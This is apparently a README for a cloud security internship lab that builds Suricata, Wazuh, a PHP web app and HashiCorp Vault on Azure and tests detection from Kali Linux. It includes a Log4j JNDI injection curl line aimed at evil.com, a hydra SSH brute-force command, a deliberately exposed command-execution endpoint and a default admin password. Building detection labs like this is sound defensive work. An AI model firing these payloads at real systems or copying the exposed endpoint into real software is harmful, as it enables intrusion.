# Cloud Security Project - Master Implementation Guide

## Executive Summary

This project implements a complete cloud security monitoring and detection architecture, integrating multiple security tools across on-premises virtual machines and Microsoft Azure cloud infrastructure.

| Component | Technology | Status |
|-----------|-----------|--------|
| **IDS/IPS (VMs)** | Suricata | Installed |
| **SIEM (Azure)** | Wazuh | Installed |
| **Web App (Azure)** | OCP PHP + MySQL | Ready to Deploy |
| **PAM (Azure)** | HashiCorp Vault | Ready to Deploy |
| **Custom Domain** | Let's Encrypt SSL | Ready to Configure |
| **Attack Testing** | Kali Linux | Scripts Ready |

---

## Architecture Overview

```
                                  ┌─────────────────────────────────────┐
                                  │          AZURE CLOUD                │
                                  │                                     │
  ┌──────────────┐    HTTPS      │  ┌──────────────┐  ┌─────────────┐ │
  │   Internet   │◄─────────────►│  │  Azure App   │  │  Azure MySQL │ │
  │              │               │  │  Service     │  │  Database    │ │
  └──────────────┘               │  │  (OCP PHP)   │  │              │ │
       │    │                     │  └──────────────┘  └─────────────┘ │
       │    │                     │         ▲                           │
       │    │                     │         │                           │
       │    │                     │  ┌──────────────┐                   │
       │    │                     │  │  Wazuh       │◄──── Wazuh API    │
       │    │                     │  │  Dashboard   │                   │
       │    │  wazuh.yourdomain   │  │  (Azure VM)  │                   │
       │    └────────────────────►│  └──────┬───────┘                   │
       │                          │         ▲                           │
       │                          └─────────┼───────────────────────────┘
       │                                    │ Agents (port 1514)
       │                          ┌─────────┼─────────┐
       │                          │         │         │
  ┌────┴──────────┐    ┌────────┴───┐ ┌───┴──────┐ ┌┴────────────┐
  │   Kali Linux  │    │   Debian   │ │  Ubuntu  │ │  Windows 10 │
  │   (Attacker)  │    │  (Suricata)│ │(Suricata)│ │  (Wazuh)    │
  └───────────────┘    └────────────┘ └──────────┘ └─────────────┘
         │
    SSH/HTTP Attacks ──────────────────────────────────────────────►
```

---

## Phase Execution Order

### Phase 1: SIEM Validation (Week 1) ✅ Scripts Ready

| Day | Task | Tools | Expected Output |
|-----|------|-------|-----------------|
| 1 | Verify Suricata → Wazuh log forwarding | `tail -f /var/log/suricata/fast.log` | Alerts in Wazuh |
| 1 | Verify Wazuh agent connectivity | `agent_control -lc` | 3+ agents active |
| 2 | Port scanning attacks | `nmap -sS`, `nmap -A` | ET SCAN alerts |
| 2 | ICMP sweep tests | `nmap -sn` | Network scan alerts |
| 3 | SSH brute force attacks | `hydra -l root -P rockyou.txt` | Rule 5712 alerts |
| 3 | Manual failed login tests | `ssh fakeuser@target` | Auth failure alerts |
| 4 | Deploy custom Wazuh rules | Copy `local_rules.xml` | Log4j, XSS, LFI detection |
| 5 | Fill detection matrix | Document in `matrix-template.md` | Completed matrix with screenshots |

**Key Files:**
- `phase1-siem-validation/attack-scripts/01-reconnaissance-scans.sh`
- `phase1-siem-validation/attack-scripts/02-brute-force-attacks.sh`
- `phase1-siem-validation/attack-scripts/03-web-application-attacks.sh`
- `phase1-siem-validation/attack-scripts/04-payloads-and-exploits.sh`
- `phase1-siem-validation/attack-scripts/verify-detection.sh`
- `phase1-siem-validation/wazuh-custom-rules/local_rules.xml`
- `phase1-siem-validation/detection-matrix/matrix-template.md`

---

### Phase 2: Deploy OCP Web App (Week 2)

| Day | Task | Commands | Notes |
|-----|------|----------|-------|
| 1 | Review & customize application | Edit `config/config.php` | Update DB credentials |
| 2 | Initialize Azure resources | `./azure-deploy/azure-deploy.sh` | Requires `az login` |
| 2 | Run database schema | `mysql -h ... < database/schema.sql` | Creates tables + seed data |
| 3 | Deploy application code | Included in azure-deploy.sh | ZIP deploy to App Service |
| 3 | Test basic functionality | `curl https://<app>.azurewebsites.net` | Should show login page |
| 4 | Test authentication | Login with admin/Admin@OCP2024! | Change password immediately |
| 4 | Test vulnerable endpoints | `curl ".../api/execute?cmd=whoami"` | Should execute (for testing) |
| 5 | Document web app URLs | Add to detection matrix | For Phase 1 web attack testing |

**Key Files:**
- `phase2-ocp-webapp/app/` - Full PHP application
- `phase2-ocp-webapp/database/schema.sql` - MySQL schema
- `phase2-ocp-webapp/azure-deploy/azure-deploy.sh` - Azure deployment

---

### Phase 3: Custom Domain + SSL (Week 3)

| Day | Task | Details |
|-----|------|---------|
| 1 | Purchase/register domain | Any registrar (Namecheap, GoDaddy, etc.) |
| 1 | Create DNS records | `app.yourdomain.com` → Azure App Service IP/CNAME |
| 2 | Configure Azure App Service domain | Add custom domain in Azure Portal |
| 2 | Enable managed SSL certificate | Free certificate from Azure |
| 3 | Configure Wazuh VM with nginx | `apt install nginx` |
| 3 | Setup `wazuh.yourdomain.com` DNS | A record → Wazuh VM public IP |
| 4 | Deploy nginx proxy config | Copy `wazuh-dashboard-proxy.conf` |
| 4 | Obtain Let's Encrypt certificate | `./setup-ssl.sh yourdomain.com` |
| 5 | Test both HTTPS endpoints | Verify padlock in browser |
| 5 | Update Wazuh agent config | Point to new wazuh.yourdomain.com |

**Key Files:**
- `phase3-custom-domain/nginx-configs/wazuh-dashboard-proxy.conf`
- `phase3-custom-domain/ssl-scripts/setup-ssl.sh`
- `phase3-custom-domain/dns-records/template.md`

**Required DNS Records:**

| Type | Host | Value | Purpose |
|------|------|-------|---------|
| A | `app` | Azure App Service IP | OCP Web Application |
| CNAME | `wazuh` | Wazuh VM hostname | Wazuh Dashboard |
| A | `vault` | Vault VM IP | HashiCorp Vault (Phase 4) |

---

### Phase 4: HashiCorp Vault PAM (Week 4)

| Day | Task | Verification |
|-----|------|-------------|
| 1 | Prepare Vault server VM | Ubuntu 22.04, 2GB+ RAM |
| 1 | Run Vault installation | `./install-vault.sh` | Vault UI accessible |
| 2 | Initialize and unseal Vault | Save keys securely | `vault status` shows unsealed |
| 2 | Enable KV secrets engine | `vault secrets enable -version=2 kv` | Can write/read secrets |
| 3 | Enable AppRole auth | `vault auth enable approle` | Role ID obtained |
| 3 | Create OCP application policy | `vault policy write ocp-app ...` | Policy attached to role |
| 4 | Store database credentials in Vault | `vault kv put secret/ocp/database ...` | Can retrieve via API |
| 4 | Configure OCP app for Vault | Set `VAULT_ENABLED=true` | App reads DB creds from Vault |
| 5 | Test credential rotation | Update secret, verify app still works | Zero-downtime rotation |

**Key Files:**
- `phase4-vault-pam/vault-config/install-vault.sh`
- `phase4-vault-pam/app-integration/vault-client.php`

---

## Testing & Validation

### Complete Attack Chain Test (Run After All Phases)

```bash
# From Kali Linux:

# 1. Reconnaissance
nmap -sS app.yourdomain.com
# Expected: Suricata alerts on Ubuntu agent, visible in Wazuh

# 2. Web vulnerability scan
nikto -h https://app.yourdomain.com
# Expected: Suricata WEB_SERVER alerts, Wazuh web attack alerts

# 3. Test Log4j detection
curl -A '${jndi:ldap://evil.com/a}' https://app.yourdomain.com
# Expected: Wazuh rule 100040 (CRITICAL severity)

# 4. Verify Vault-secured credentials
curl https://app.yourdomain.com
# Expected: App works, but no hardcoded DB credentials anywhere
```

---

## Security Considerations

### Hardening Checklist

- [ ] Change all default passwords (Wazuh, OCP admin, MySQL)
- [ ] Enable Azure NSG rules - restrict ports 22, 443 only
- [ ] Configure Wazuh IP whitelisting for dashboard
- [ ] Store Vault unseal keys in secure offline location
- [ ] Enable Azure Key Vault for additional secret storage
- [ ] Set up Azure Sentinel integration (optional)
- [ ] Configure log retention policies (90 days minimum)
- [ ] Enable Azure Backup for VMs

### Ports Reference

| Port | Service | VM | Access From |
|------|---------|-----|------------|
| 22 | SSH | All | Your IP only |
| 80 | HTTP | Wazuh, Vault | All (redirects to 443) |
| 443 | HTTPS | Wazuh, Vault | All |
| 1514 | Wazuh Agent | Wazuh Server | VMs only |
| 55000 | Wazuh API | Wazuh Server | Wazuh Dashboard |
| 5601 | Wazuh Dashboard | Wazuh Server | localhost (via nginx) |
| 8200 | Vault API/UI | Vault Server | OCP App, Admins |
| 3306 | MySQL | Azure | App Service only |

---

## Troubleshooting

### Common Issues

**Wazuh agent not connecting:**
```bash
# On agent VM
sudo systemctl restart wazuh-agent
sudo cat /var/ossec/logs/ossec.log | grep ERROR

# On Wazuh server
sudo /var/ossec/bin/agent_control -lc
```

**Suricata not generating alerts:**
```bash
# Check if running
sudo systemctl status suricata

# Check rules loaded
sudo suricata -T -c /etc/suricata/suricata.yaml

# Verify eve.json output
sudo tail -f /var/log/suricata/eve.json
```

**Vault sealed after restart:**
```bash
# Unseal with 3 keys
vault operator unseal <key1>
vault operator unseal <key2>
vault operator unseal <key3>

# Consider auto-unseal with Azure Key Vault for production
```

---

## Deliverables for Evaluation

| Deliverable | Location | Format |
|-------------|----------|--------|
| Network Architecture Diagram | `docs/architecture-diagrams/` | PNG + source |
| Detection Matrix | `phase1-siem-validation/detection-matrix/` | Markdown + screenshots |
| Attack Scripts | `phase1-siem-validation/attack-scripts/` | Bash scripts |
| OCP Source Code | `phase2-ocp-webapp/app/` | PHP |
| Azure Deployment Scripts | `phase2-ocp-webapp/azure-deploy/` | Bash + Bicep |
| SSL Configuration | `phase3-custom-domain/` | Nginx conf + scripts |
| Vault Configuration | `phase4-vault-pam/` | HCL + scripts |
| Demo Video | Record manually | MP4 showing attack → detection |

---

*Project completed: $(date)*
*Cloud Security Internship Project*
